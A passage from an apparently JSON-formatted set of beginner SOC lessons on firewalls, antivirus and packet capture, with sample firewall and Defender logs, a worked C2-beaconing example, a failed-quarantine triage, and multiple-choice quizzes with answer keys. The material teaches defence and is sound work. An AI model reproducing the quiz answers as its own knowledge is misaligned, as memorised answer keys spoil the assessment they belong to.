DMZ_Web | HTTP/S | Allow |\n| 3 | Any | Any | RDP | Deny |\n| 4 | Any | Any | Any | Deny (default) |\n\nThis is the ordered-rulebase idea from the first section made visible: rule 1 permits normal outbound browsing, rule 2 lets the internet reach only the DMZ web servers, rule 3 explicitly blocks RDP from anywhere, and rule 4 is the **default-deny** catch-all at the bottom, silently blocking anything the rules above did not address.\n\n### Why the syntax differs but the logic doesn't\n\nWhatever the platform, you are always reading the same four things: **direction**, **the matched traffic** (five-tuple), **the action**, and (implicitly) **the rule's position in the order**. Once you can parse one platform's syntax into those four questions, reading an unfamiliar firewall's rule — or its logs — stops being intimidating; you are just mapping unfamiliar keywords onto a model you already know."
    },
    {
      "heading": "Ingress, Egress, and Why Outbound Matters",
      "content": "Firewalls filter traffic in two directions, and a common beginner mistake is to focus only on one. Both directions carry security signal, and for a SOC the *less obvious* one is often the more valuable.\n\n**Ingress (inbound) filtering** controls traffic coming *into* the network from outside. This is the intuitive job of a firewall: keep attackers out. Ingress rules block unsolicited connections to internal services, so the internet cannot directly reach your servers' management ports, databases, or file shares. A firewall exposing something like Remote Desktop (port 3389) or a database port to the whole internet is the classic dangerous misconfiguration, because it invites direct attack.\n\n**Egress (outbound) filtering** controls traffic leaving the network. This is frequently neglected — many organisations allow almost all outbound traffic — but it is enormously important for detection, for one central reason: **after an attacker is already inside, their activity shows up as outbound traffic.**\n\nConsider what an intruder must do once they have a foothold:\n\n- **Command and control (C2)** — their malware reaches *out* to the attacker's server for instructions.\n- **Data exfiltration** — stolen data flows *out* of the network to somewhere the attacker controls.\n- **Downloading tools** — additional payloads are pulled *in*, initiated by an outbound request.\n\nEvery one of these crosses the firewall **outbound**. This is why **egress filtering** — restricting and closely watching what may leave — is such a powerful control. If internal machines are only allowed to reach approved destinations and ports, an attacker's C2 connection to an unknown server is blocked or, at minimum, logged as an anomaly. A blocked or unusual *outbound* connection is often the first sign that a machine inside your walls is compromised.\n\nThe takeaway for an analyst is to give outbound firewall activity as much attention as inbound. Inbound denials tell you who is knocking; **outbound denials and anomalies often tell you who is already inside and trying to phone home.** That reframing — the firewall as a detector of insiders reaching out, not just a wall against outsiders reaching in — is what makes firewall logs a live investigation tool rather than a passive barrier."
    },
    {
      "heading": "Reading Firewall Logs as an Analyst",
      "content": "Firewalls generate logs of the decisions they make, and those logs are among the most-used data sources in a SOC. Learning to read them turns the firewall from a silent barrier into a rich source of evidence.\n\n### What a firewall log entry contains\n\nA typical entry records the essentials of one connection decision:\n\n- The **action** — allowed or denied (blocked).\n- The **source and destination IP**, and the **ports** and **protocol** — the five-tuple.\n- A **timestamp**, and often the **rule** that matched, the **direction**, and bytes transferred.\n\nReading an entry is a matter of assembling these into a sentence: *\"at this time, traffic from this source to this destination on this port was allowed or denied by this rule.\"*\n\n**What analysts hunt for in firewall logs:**\n\n- **Denied inbound bursts** — many blocked connection attempts to a range of ports from one external source is **port scanning**, an attacker mapping what is exposed.\n- **Outbound connections to suspicious destinations** — an internal machine reaching out to a known-bad IP, a newly-registered domain, or an unusual country/port is a strong **C2 or exfiltration** signal. This is where egress visibility pays off.\n- **Large outbound data transfers** — an internal host sending an unusually large volume out can indicate **data exfiltration**.\n- **Traffic that should never happen** — a workstation connecting directly to the internet on an odd port, or one internal machine scanning many others (possible lateral movement).\n- **Allowed traffic to risky services** — connections reaching management ports that should be restricted.\n\n### How to use them\n\nFirewall logs are best as **one source among several**. On their own they show *that* a connection happened; combined with endpoint telemetry (which process made it) and threat intelligence (is that destination known-bad), they become conclusive. A classic pivot: a firewall log shows a workstation beaconing to an external IP every few minutes; you pivot to the endpoint's process tree to find *which* process is doing it, and to threat intel to confirm the destination — turning a firewall line into a full C2 detection.\n\nThe mindset is that the firewall is both a **control** (it blocks) and a **sensor** (it records). Even traffic it *allows* is logged, so firewall data helps you reconstruct what happened even when nothing was blocked. Used well — with special attention to outbound activity — firewall logs are often where the first thread of a real intrusion is pulled."
    },
    {
      "heading": "Worked Example: Reading Firewall Logs to Catch C2 Beaconing",
      "content": "### The starting signal\n\nA daily 'top talkers' dashboard flags one internal workstation, `10.14.22.108`, for an unusual amount of allowed outbound traffic overnight. You pull the firewall log for that host.\n\n```\ntime=2026-08-14T02:03:11Z action=allow src=10.14.22.108 dst=91.203.5.14 sport=51422 dport=443 proto=TCP bytes=1204 rule=\"Allow_Outbound_HTTPS\"\ntime=2026-08-14T02:08:11Z action=allow src=10.14.22.108 dst=91.203.5.14 sport=51498 dport=443 proto=TCP bytes=1198 rule=\"Allow_Outbound_HTTPS\"\ntime=2026-08-14T02:13:11Z action=allow src=10.14.22.108 dst=91.203.5.14 sport=51576 dport=443 proto=TCP bytes=1211 rule=\"Allow_Outbound_HTTPS\"\n```\n\n### Step 1 — notice the shape, not just the content\n\nNothing here was *blocked* — every connection matched a normal allow-rule for outbound HTTPS, which is exactly why this never generated a deny-based alert. What stands out instead is the **pattern**: a connection to the same destination IP, on the same port, almost exactly every five minutes, with nearly identical byte counts. This is the flat, mechanically regular shape of **beaconing**, not the bursty, irregular pattern of a person browsing.\n\n### Step 2 — check the destination's reputation\n\nA threat-intelligence lookup on `91.203.5.14` shows the IP has no prior legitimate business association, was registered to hosting infrastructure only weeks ago, and has been reported in connection with a known malware family's command-and-control infrastructure.\n\n### Step 3 — pivot to the endpoint\n\nEDR process telemetry for `10.14.22.108` at `02:03–02:13` shows a PowerShell process with no visible window making these exact outbound connections, and its parent process is a Word document opened earlier that evening from an email attachment.\n\n### Step 4 — the verdict\n\nThe firewall log alone showed only \"allowed traffic, nothing blocked\" — invisible to a defender only watching for denials. But read as evidence rather than as a pass/fail control, it revealed a textbook C2 beacon: fixed interval, fixed destination, fixed size, to a freshly-registered and reputationally bad IP, generated by PowerShell hanging off a phishing document. This is the payoff of the lesson's central reframing — the firewall as **sensor**, not just **wall**: the most important line in this log was one the firewall itself was perfectly happy to allow."
    }
  ],
  "keyTakeaways": [
    "A firewall allows or blocks each connection by matching its five-tuple (source/destination IP, source/destination port, protocol) against an ordered rulebase, where the first match usually wins and a well-configured firewall ends in default-deny (block anything not explicitly allowed).",
    "Firewalls vary in inspection depth: stateless packet filters check each packet alone, stateful firewalls track connections (allowing replies to permitted outbound requests), and NGFWs add application-awareness and content/threat inspection; they also run at the network edge or as host-based firewalls (Windows Defender Firewall, iptables).",
    "The same five-tuple-plus-action model appears across platforms — iptables/nftables (Linux), netsh advfirewall (Windows), and enterprise NGFW rule tables — so once you can parse direction, matched traffic, action, and rule order in one syntax, any firewall's rules or logs become readable.",
    "Both directions matter, but egress (outbound) filtering is the under-used, high-value control: an attacker who is already inside reveals themselves through outbound C2, data exfiltration, and tool downloads, so a blocked or unusual outbound connection is often the first sign of compromise.",
    "Firewall logs record the action (allow/deny), five-tuple, time, and matched rule; analysts hunt denied inbound bursts (port scanning), outbound connections to suspicious destinations (C2/exfil), large outbound transfers, and traffic that should never happen — a worked example shows how even fully allowed traffic can reveal C2 beaconing through its interval, destination, and size pattern."
  ],
  "quiz": [
    {
      "question": "Why is egress (outbound) firewall filtering considered such a valuable detection control, even though a firewall's most intuitive job is blocking inbound attacks?",
      "options": [
        {
          "label": "Because outbound filtering encrypts all leaving traffic, which is the only way to prevent an external attacker from ever scanning the network's open ports.",
          "value": "a"
        },
        {
          "label": "Because once an attacker is already inside, their command-and-control, data exfiltration, and tool downloads all cross the firewall outbound, so egress control catches them.",
          "value": "b"
        },
        {
          "label": "Because outbound rules are the only rules a firewall logs, so inbound traffic decisions are never recorded and cannot be reviewed by an analyst afterward.",
          "value": "c"
        },
        {
          "label": "Because egress filtering automatically assigns IP addresses to internal hosts, replacing DHCP and ensuring every machine can reach the internet safely.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Egress filtering is powerful because an attacker who already has a foothold must reach outward — for C2 instructions, to exfiltrate data, and to download tools — so controlling and watching outbound traffic catches activity that inbound-only defence misses, and a blocked/unusual outbound connection is often the first sign of compromise. Option a wrongly claims egress encrypts traffic. Option c is false because firewalls log inbound decisions too. Option d confuses firewalls with DHCP."
    },
    {
      "question": "In firewall logs you see a single external IP generating hundreds of denied inbound connection attempts across many different ports within a minute. What does this pattern most likely represent?",
      "options": [
        {
          "label": "A stateful inspection failure, because a correctly configured firewall would have allowed all of these connections rather than denying any of them.",
          "value": "a"
        },
        {
          "label": "Port scanning, an attacker probing many ports to map which services are exposed, revealed here by the burst of denied attempts across different ports.",
          "value": "b"
        },
        {
          "label": "Normal web browsing, because loading a single modern website legitimately opens hundreds of simultaneous inbound connections from the server to the user.",
          "value": "c"
        },
        {
          "label": "Data exfiltration, because stolen data always leaves the network as a rapid series of denied inbound connections from an external address.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Many denied inbound attempts to a range of ports from one external source is the classic signature of port scanning — an attacker mapping which services are exposed — and the denials show the firewall refusing the probes. Option a misreads normal deny behaviour as a failure. Option c is wrong because web browsing is outbound-initiated by the user, not hundreds of inbound connections. Option d describes exfiltration, which is outbound, not denied inbound traffic."
    },
    {
      "question": "A firewall log shows a workstation making an ALLOWED outbound HTTPS connection to the same external IP roughly every five minutes, each transferring nearly identical byte counts. Why is this worth investigating even though nothing was blocked?",
      "options": [
        {
          "label": "It is not worth investigating at all, because firewall logs only carry real security value when they record a denied connection attempt.",
          "value": "a"
        },
        {
          "label": "The fixed interval, destination, and size match the regular, mechanical pattern of C2 beaconing, unlike bursty human browsing traffic, even though the firewall allowed it.",
          "value": "b"
        },
        {
          "label": "It indicates the firewall's stateful tracking has failed, since a properly functioning stateful firewall would automatically deny any repeating connection pattern.",
          "value": "c"
        },
        {
          "label": "It confirms the destination IP belongs to the company's own cloud backup service, which always connects on a fixed five-minute schedule.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A connection to the same destination, at a fixed interval, with near-identical byte counts is the mechanically regular signature of malware beaconing to command-and-control, in contrast to the bursty, irregular pattern of real human browsing — and being allowed does not make it benign, since the firewall's job here was never to block a legitimately-permitted port like 443. Option a wrongly assumes only denied traffic matters, ignoring the firewall's role as a sensor. Option c invents a stateful-tracking failure that isn't implied. Option d assumes an identity for the destination that the scenario never establishes; that must be confirmed via threat intel, not assumed."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/security/operating-system-security/network-security/windows-firewall/",
    "https://csrc.nist.gov/pubs/sp/800/41/r1/final",
    "https://attack.mitre.org/techniques/T1071/",
    "https://netfilter.org/documentation/"
  ],
  "xp": 220,
  "estimatedMinutes": 48,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-antivirus-fundamentals",
  "slug": "antivirus-fundamentals",
  "title": "Antivirus Fundamentals",
  "topic": "Endpoint Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Antivirus is the security control almost everyone has heard of — the software that scans for and removes malware. But for a SOC analyst, 'antivirus caught something' is the beginning of an investigation, not the end, and understanding how antivirus actually decides what is malicious (and what it inevitably misses) is essential to triaging its alerts correctly. This lesson explains what antivirus is, the detection methods it uses, what it does when it finds something, its real limitations and how it relates to EDR, the actual Windows Defender events (1116/1117) and command-line tools you will meet in real telemetry, how an analyst reads an antivirus alert — including the critical difference between a threat that was blocked and one that was merely detected — and a full worked example of triaging a failed quarantine.",
  "sections": [
    {
      "heading": "What Antivirus Is and How It Detects",
      "content": "**Antivirus (AV)** is software that detects, blocks, and removes malicious programs — malware — from a computer. It runs on endpoints (laptops, servers) and continuously watches for files and behaviours it recognises as harmful. It is the most established layer of endpoint defence, and for most machines it is the first automated line stopping known threats.\n\nThe core of antivirus is **how it decides something is malicious**, and there are several detection methods, each with different strengths. Knowing them explains both what AV catches and what it misses.\n\n- **Signature-based detection.** The classic method: the AV maintains a huge database of **signatures** — fingerprints of known malware, such as a file's hash or a distinctive byte pattern. When it scans a file, it checks whether the file matches a known signature. This is fast and accurate for *known* malware, but it is blind to anything new — a threat with no signature yet slips through. The analogy is recognising a known criminal from a wanted-poster photo: excellent if you have the photo, useless for someone new.\n- **Heuristic detection.** To catch variants and unknown files, AV uses **heuristics** — rules and static analysis that look for *suspicious characteristics* rather than an exact match: code that resembles known malware families, suspicious structure, or known-bad techniques. Heuristics catch more, but at the cost of occasional **false positives** (flagging benign files).\n- **Behaviour-based detection.** Rather than judging a file at rest, this watches what a program *does when it runs* — if it starts encrypting many files, injecting into other processes, or modifying system settings, it is flagged by behaviour even if its file was unknown. This catches novel and fileless threats that static methods miss.\n- **Machine learning and cloud reputation.** Modern AV adds ML models trained to distinguish malicious from benign files, and **cloud reputation** lookups that check a file's prevalence and history across millions of machines — a brand-new, rare, unsigned file is inherently more suspicious.\n\nMost real antivirus blends all of these. The key insight for an analyst is that **each method has a blind spot**: signatures miss the new, heuristics can false-positive, behaviour needs the threat to run first. That layered-but-imperfect nature is exactly why AV alerts require human judgement, and why AV is one layer rather than the whole defence."
    },
    {
      "heading": "Scanning Modes and What AV Does on a Detection",
      "content": "Antivirus applies its detection methods in two timing modes, and takes specific actions when it finds something — both of which shape the alerts an analyst sees.\n\n### Real-time (on-access) scanning\n\nThe AV inspects files *as they are accessed* — created, opened, downloaded, or executed — and can block a threat before it runs. This is the always-on protection that stops a malicious download the moment it lands. It is the most important mode for prevention, because it acts at the instant of danger.\n\n### On-demand scanning\n\nA scan the user or admin runs deliberately — a full or targeted sweep of the disk — to find dormant threats that may have been missed or that arrived before protection was in place. Scheduled scans are a form of this.\n\n### What AV does when it detects a threat\n\nThe action taken is crucial for an analyst to understand, because it determines whether the threat was neutralised:\n\n- **Quarantine** — the most common action: the AV isolates the file, moving it to a secure, locked location where it cannot execute, while preserving it (so it can be restored if it was a false positive, or analysed). A quarantined threat is contained.\n- **Block / prevent** — the AV stops the malicious action from happening at all (for example, preventing execution).\n- **Remove / delete / clean** — the AV deletes the malicious file or attempts to remove malicious parts from an infected file.\n- **Allow / detect only** — in some configurations, or when it lacks permission, the AV *reports* the detection but does **not** stop it. This is the dangerous case, covered in a later section.\n\nAlongside the action, the AV records a **detection name** — a label like `Trojan:Win32/...` — that identifies what it thinks it found. These names are vendor-specific and sometimes generic, so they are a starting hint, not a definitive verdict.\n\nThe practical point is that **a detection and a successful response are two different things**. The most important question when an AV alert arrives is not just \"what did it find?\" but \"**what did it actually do about it — and did that succeed?**\" A quarantined or blocked threat is contained; a merely-detected one may still be active. Reading that action correctly is the heart of AV alert triage."
    },
    {
      "heading": "The Limits of Antivirus — and AV vs EDR",
      "content": "Antivirus is essential, but understanding its **limits** is what separates a novice who trusts every green checkmark from an analyst who knows when to keep digging.\n\n**What antivirus struggles with:**\n\n- **Zero-day and novel malware.** Signature-based detection is blind to threats it has never seen, and even heuristics and ML miss genuinely new techniques. Fresh malware routinely evades AV for a window of time.\n- **Fileless and living-off-the-land attacks.** Much modern intrusion uses no malicious *file* at all — abusing legitimate tools like PowerShell, WMI, and built-in binaries (LOLBins). Traditional file-scanning AV has little to grab onto when there is no file to scan.\n- **Evasion techniques.** Attackers deliberately defeat AV by **packing** and **obfuscating** their code (changing its appearance to break signatures), encrypting payloads, and testing their malware against AV engines before deploying it. Some malware also tries to disable the AV outright.\n- **In-memory and injected code.** Code running only in memory, or injected into a trusted process, may never touch disk where file scanning looks.\n\nThese gaps are exactly why the industry moved beyond classic AV, and it is worth being clear on the vocabulary:\n\n- **Traditional AV** focuses on detecting and blocking known-bad *files*, mostly at the moment of access. It answers \"is this file malicious?\"\n- **NGAV (Next-Generation Antivirus)** strengthens this with heavier behaviour analysis, ML, and cloud reputation to catch more of the unknown and fileless threats.\n- **EDR (Endpoint Detection and Response)** goes further still: rather than only blocking, it **records** endpoint activity continuously (processes, connections, file and registry changes) so analysts can *hunt, investigate, and respond* to threats that got past prevention — including the fileless and in-memory attacks AV misses. (EDR has its own lesson.)\n\nThe relationship is layered, not either/or: AV/NGAV is the **prevention** layer that stops the majority of known and obvious threats automatically, and EDR is the **detection and response** layer that gives analysts visibility into what prevention missed. A mature endpoint strategy runs both. For an analyst, the mental model is that **antivirus is a strong filter, not a guarantee** — a clean AV result narrows the odds but never proves a machine is safe, which is why AV alerts feed into a broader investigation rather than closing it."
    },
    {
      "heading": "AV Telemetry: Windows Defender Events and Tools",
      "content": "### Windows Defender as a concrete example\n\nBecause Windows Defender (Microsoft Defender Antivirus) ships on every modern Windows machine, its logging is the AV telemetry a SOC analyst meets most often, and it is a good concrete anchor for the abstract concepts above.\n\n**Event ID 1116 — a threat was detected:**\n\n```\nEvent ID: 1116 (Microsoft-Windows-Windows Defender)\nThreat Name: Trojan:Win32/Wacatac.B!ml\nSeverity: Severe\nPath: file:_C:\\Users\\d.rosen\\Downloads\\invoice_final.exe\nDetection Origin: Local machine\nDetection Type: Concrete\n```\n\n**Event ID 1117 — an action was taken:**\n\n```\nEvent ID: 1117 (Microsoft-Windows-Windows Defender)\nThreat Name: Trojan:Win32/Wacatac.B!ml\nAction: Quarantine\nAction Status: Success\n```\n\nThese two events pair up exactly with the earlier concepts: **1116** is the *detection* (a detection name — here a generic, ML-influenced label, `!ml` signalling a machine-learning-assisted verdict — a file path revealing it was a Downloads-folder executable, and a severity), and **1117** is the *action* and, critically, whether it **succeeded**. Note `Action Status: Success` — this is the field an analyst checks first; had it read `Failed` or had the Action been `Allow`, this alert would demand immediate escalation rather than routine logging.\n\n**Where quarantined files go:** Defender moves the file to a protected quarantine store (under `C:\\ProgramData\\Microsoft\\Windows Defender\\Quarantine`) that ordinary processes, including malware, cannot execute from — which is why 'quarantined' genuinely means contained, not just labelled.\n\n### The MpCmdRun tool\n\nAdministrators (and, in a pinch, analysts on an isolated host) can drive Defender from the command line:\n\n```\nC:\\> MpCmdRun.exe -Scan -ScanType 3 -File \"C:\\Users\\d.rosen\\Downloads\\invoice_final.exe\"\nC:\\> MpCmdRun.exe -Restore -ListAll\n```\n\nThe first runs a targeted scan of a specific file; the second lists everything currently sitting in quarantine — useful for confirming a threat is actually contained, or for restoring a file if it turns out to be a false positive.\n\n### Other AV/NGAV telemetry shapes\n\nOther vendors (CrowdStrike Falcon Prevent, SentinelOne, Sophos) expose the same three ideas — a detection identifier, a file/process context, and an action-with-status — through their own consoles and APIs, so the pattern you learn from Defender's 1116/1117 pair transfers directly: **find the detection, find the action, and confirm the action's status** before deciding whether an alert is closed or still an active incident."
    },
    {
      "heading": "Reading Antivirus Alerts as an Analyst",
      "content": "When an antivirus alert reaches the SOC, the analyst's job is to interpret it correctly and decide what to do next. A few fields and one critical distinction drive that triage.\n\n**What an AV alert contains:**\n\n- The **detection name** — what the AV thinks it found (e.g. a trojan, a specific family, or a generic label). Treat this as a lead, not a final verdict.\n- The **file path and hash** — *what* was detected and *where* it sat. The path is telling: malware in a user's Temp or Downloads folder, or masquerading in a system directory, is more suspicious than a flagged file in an expected location.\n- The **action taken** — quarantined, blocked, removed, or only detected/allowed.\n- The **host and user**, and the **timestamp**.\n\n**The single most important question: was it actually stopped?** The difference between \"**quarantined/blocked**\" and \"**detected but not remediated**\" changes everything:\n\n- A threat that was **quarantined or blocked** is contained. You still investigate how it arrived and whether it acted first, but the immediate danger is handled.\n- A threat that was **detected but not quarantined or blocked** — because of a permission issue, an error, or the AV being configured to detect-only — means **the malicious file may still be present and active.** This is a high-priority situation: the AV saw the threat and did *not* stop it, so containment now falls to you.\n\nThis is why an analyst never reads an AV alert as simply \"AV handled it.\" You read the *action*, and if it is anything other than a clean quarantine/block, you treat the host as potentially compromised.\n\n### How AV alerts fit the bigger picture\n\nA single AV detection is a thread to pull, not a closed case, because AV catches the *symptom* it recognised while the rest of an intrusion may be invisible to it. Sound triage pivots outward:\n\n- **To the endpoint / EDR** — what process dropped or launched the file? What is its process tree (recall that lesson)? Did anything else run around the same time?\n- **To repetition and spread** — is the same detection firing on other machines (a campaign or worm)?\n- **To what preceded it** — a phishing email, a suspicious download, a new scheduled task or service.\n\nThe overarching mindset: **antivirus tells you what it managed to recognise, which is a lower bound on what happened, not the whole story.** A blocked detection is reassuring but still worth understanding; an unblocked detection is an active incident. Reading the action correctly, and pivoting from the AV alert into the endpoint's fuller telemetry, is how a routine antivirus notification becomes a properly scoped investigation."
    },
    {
      "heading": "Worked Example: Triaging a Failed Quarantine",
      "content": "### The alert\n\nYour SIEM ingests a Defender event pair for a marketing-team laptop:\n\n```\nEvent ID: 1116\nThreat Name: Trojan:Win32/Wacatac.B!ml\nPath: file:_C:\\Users\\r.patel\\Downloads\\Q3_forecast.xlsm.exe\nSeverity: Severe\n\nEvent ID: 1117\nThreat Name: Trojan:Win32/Wacatac.B!ml\nAction: Quarantine\nAction Status: Failed\nError Code: 0x80070005 (Access Denied)\n```\n\n### Step 1 — read the action, not just the detection\n\nThe detection name and severity look identical to a routine, successfully-handled alert — but **Action Status: Failed** changes everything. Defender recognised the threat and tried to quarantine it, but a permissions error prevented that from completing. Per the earlier section's core rule, this is not \"AV handled it\" — the file is potentially **still present and executable**.\n\n### Step 2 — check the file name for social engineering\n\n`Q3_forecast.xlsm.exe` is a classic double-extension trick: at a glance (with extensions hidden, Windows' default setting) this looks like an Excel file, `Q3_forecast.xlsm`, but it is actually a `.exe`. Combined with it living in Downloads, this points to the user having been socially engineered into downloading and running it — a step AV's real-time scanning tried, and failed, to stop.\n\n### Step 3 — pivot to EDR immediately\n\nBecause the file may still be live, you do not wait for a scheduled scan — you pull the endpoint's process history right away and find that `Q3_forecast.xlsm.exe` did in fact execute minutes before the failed quarantine, spawning a PowerShell process that made an outbound connection to an external IP — the malware ran before, or despite, AV's attempt to stop it.\n\n### Step 4 — contain and remediate directly\n\nBecause the AV action failed, containment now falls to you: isolate the host via EDR, kill the malicious process tree, and only then attempt a manual removal or reimage — rather than trusting the AV console's 'Quarantine' label, which in this case never actually completed.\n\n### The lesson in miniature\n\nThis single event pair demonstrates the whole chapter: antivirus is a strong but fallible filter (it correctly *recognised* Wacatac.B), the action-and-status field is what tells you whether recognition became containment, and when it did not, the alert stops being a routine antivirus notification and becomes the opening move of a live investigation."
    }
  ],
  "keyTakeaways": [
    "Antivirus detects malware using layered methods — signature (fingerprints of known-bad, fast but blind to the new), heuristics (suspicious characteristics, can false-positive), behaviour (what a program does at runtime), and ML/cloud reputation — each with a blind spot, which is why AV needs human judgement.",
    "AV scans in real-time (on-access, blocking threats as files are used) and on-demand (deliberate sweeps), and on a detection it quarantines (isolates), blocks, removes, or in some cases only detects/allows — recording a vendor-specific detection name that is a lead, not a verdict.",
    "AV struggles with zero-day/novel malware, fileless/living-off-the-land attacks, evasion (packing/obfuscation), and in-memory/injected code; NGAV adds behaviour/ML and EDR adds continuous recording for hunt and response — AV is the prevention layer, EDR the detection/response layer, and both run together.",
    "Windows Defender's Event ID 1116 (detection) and 1117 (action, with an Action Status field) are the concrete telemetry pattern behind AV triage everywhere; MpCmdRun.exe lets you scan a file or list quarantine directly, and other vendors expose the same detection/action/status shape.",
    "When triaging an AV alert, the critical question is the action taken: quarantined/blocked means contained, but detected-but-not-remediated means the threat may still be active (high priority) — then pivot to endpoint/EDR, check for spread, and look at what preceded it, as a worked failed-quarantine example (a double-extension file, Access Denied, and a live PowerShell child process) shows."
  ],
  "quiz": [
    {
      "question": "An antivirus alert shows a trojan was 'detected' on a workstation, but the action field reads 'not remediated' rather than 'quarantined'. Why should this raise your priority, and what should you assume?",
      "options": [
        {
          "label": "It is lower priority, because 'detected' always means the antivirus fully removed the threat and 'not remediated' simply confirms cleanup finished successfully.",
          "value": "a"
        },
        {
          "label": "The AV saw the threat but did not stop it, so the malicious file may still be present and active, making containment your responsibility now.",
          "value": "b"
        },
        {
          "label": "It means the file was a guaranteed false positive, because antivirus only ever leaves genuinely harmless files unremediated and blocks all real malware.",
          "value": "c"
        },
        {
          "label": "It proves the workstation has no antivirus installed, since a real antivirus product is technically incapable of detecting without also removing.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A detection with no successful remediation means the AV recognised the threat but did not quarantine or block it, so the malicious file may still be present and active — a high-priority situation where containment now falls to the analyst. Option a wrongly equates 'detected' with removed. Option c falsely assumes unremediated means false positive. Option d is wrong because AV can detect without remediating (due to permissions, errors, or detect-only configuration) while still being installed."
    },
    {
      "question": "Why is a modern intrusion that abuses PowerShell and other built-in tools (a fileless / living-off-the-land attack) often able to evade traditional signature-based antivirus?",
      "options": [
        {
          "label": "Because traditional AV focuses on scanning malicious files, and a fileless attack uses legitimate built-in tools with no malicious file to match a signature against.",
          "value": "a"
        },
        {
          "label": "Because PowerShell automatically disables all antivirus products the moment it launches, leaving the endpoint completely without any protection at all.",
          "value": "b"
        },
        {
          "label": "Because signature-based antivirus only scans network traffic and never inspects any programs or scripts running locally on the endpoint itself.",
          "value": "c"
        },
        {
          "label": "Because living-off-the-land attacks are encrypted end to end, so antivirus is contractually forbidden by the vendor from inspecting them.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Traditional signature-based AV is built to recognise malicious files, but a fileless/living-off-the-land attack abuses legitimate built-in tools like PowerShell and leaves little or no malicious file to match a signature against, so it slips past file-scanning. Option b is false because PowerShell does not automatically disable AV. Option c is wrong because AV does scan local files and programs, not only network traffic. Option d invents a contractual restriction that does not exist."
    },
    {
      "question": "A Defender alert shows Trojan:Win32/Wacatac.B!ml detected in Q3_forecast.xlsm.exe, with Action: Quarantine and Action Status: Failed (Access Denied). What should you do next, and why?",
      "options": [
        {
          "label": "Close the alert, because a 'Quarantine' action label always means the threat was successfully contained regardless of the status field beside it.",
          "value": "a"
        },
        {
          "label": "Treat the host as potentially compromised and pivot to EDR immediately, because a failed quarantine means the malicious file may still be present and executable.",
          "value": "b"
        },
        {
          "label": "Wait for the next scheduled full scan to run, since Defender will automatically retry and succeed at quarantining the file within a few hours.",
          "value": "c"
        },
        {
          "label": "Rename the alert's severity to Low, because a failed action status indicates Defender misidentified a harmless file as this trojan.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Action Status: Failed means the quarantine attempt did not succeed, so the malicious file may still be present and able to run — the analyst must treat this as an active incident and pivot immediately to endpoint telemetry to check whether it already executed, rather than trusting the 'Quarantine' label alone. Option a wrongly treats the action label as proof of success, ignoring the status field. Option c assumes an automatic retry that is not guaranteed and wastes critical response time. Option d wrongly reinterprets a failed remediation as evidence of a false positive."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/defender-endpoint/next-generation-protection",
    "https://attack.mitre.org/techniques/T1562/001/",
    "https://csrc.nist.gov/glossary/term/antivirus_software",
    "https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-pcap-wireshark-for-beginners",
  "slug": "network-traffic-analysis-pcap-wireshark",
  "title": "Network Traffic Analysis with PCAP & Wireshark: A Beginner's Guide",
  "topic": "Network Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Logs tell you what a system decided to record. A packet capture tells you what actually crossed the wire — the raw conversation between two computers, exactly as it happened. For a SOC analyst, being able to open a capture and read it is like a detective being able to replay the security-camera footage instead of relying on witness statements. This beginner lesson introduces packet captures from scratch: what a packet and a PCAP are, how to read a captured packet in Wireshark, how filtering lets you find the one conversation that matters among millions, how to zoom out to statistics and back in to a single conversation, a full worked example that walks a suspicious capture from raw traffic to a verdict, and what suspicious traffic actually looks like across the attack patterns you will meet most often.",
  "sections": [
    {
      "heading": "What a Packet and a PCAP Are",
      "content": "Everything that travels across a network moves in small chunks called **packets**. When your computer loads a web page, sends an email, or talks to a server, that data is broken into many packets, each sent individually and reassembled at the other end. A **packet** is the basic unit of network communication — a small bundle carrying a piece of data plus addressing information (where it came from, where it is going, and which protocol it speaks).\n\nA **PCAP** — short for **packet capture** — is a recording of those packets, saved to a file. Just as a video recorder captures frames of what happened in a room, a packet capture records the packets that crossed a network link. The files usually end in `.pcap` or the newer `.pcapng`, and each one holds a slice of network history you can replay and examine packet by packet, long after the traffic itself is gone.\n\n### The tools\n\nThe classic tool for viewing and analysing captures is **Wireshark**, a free graphical program that opens a PCAP and lets you explore every packet visually. Its command-line relatives are **tcpdump** (widely used on Linux to capture and display packets) and **tshark** (Wireshark's command-line version). Analysts use the CLI tools to *capture* traffic on a server and Wireshark to *analyse* the result in depth.\n\n### Where captures come from\n\nTo capture traffic you have to be able to *see* it. That happens in a few ways: capturing directly on a host (recording that one machine's own traffic), or capturing at a network chokepoint using a **SPAN/mirror port** on a switch or a network **TAP** that copies traffic to a monitoring sensor. In a SOC you most often *receive* a capture — from an IDS/IPS sensor, a full-packet-capture appliance, or an incident responder — and your job is to read it.\n\nThe reason captures are so valuable is that they are **ground truth**. A firewall log says \"a connection to this IP was allowed\"; the packet capture shows you the *actual content and behaviour* of that connection — what was said, how often, and whether it looks like a browser, a file transfer, or malware phoning home. When logs are ambiguous, the packets settle the question."
    },
    {
      "heading": "Wireshark and the Anatomy of a Captured Packet",
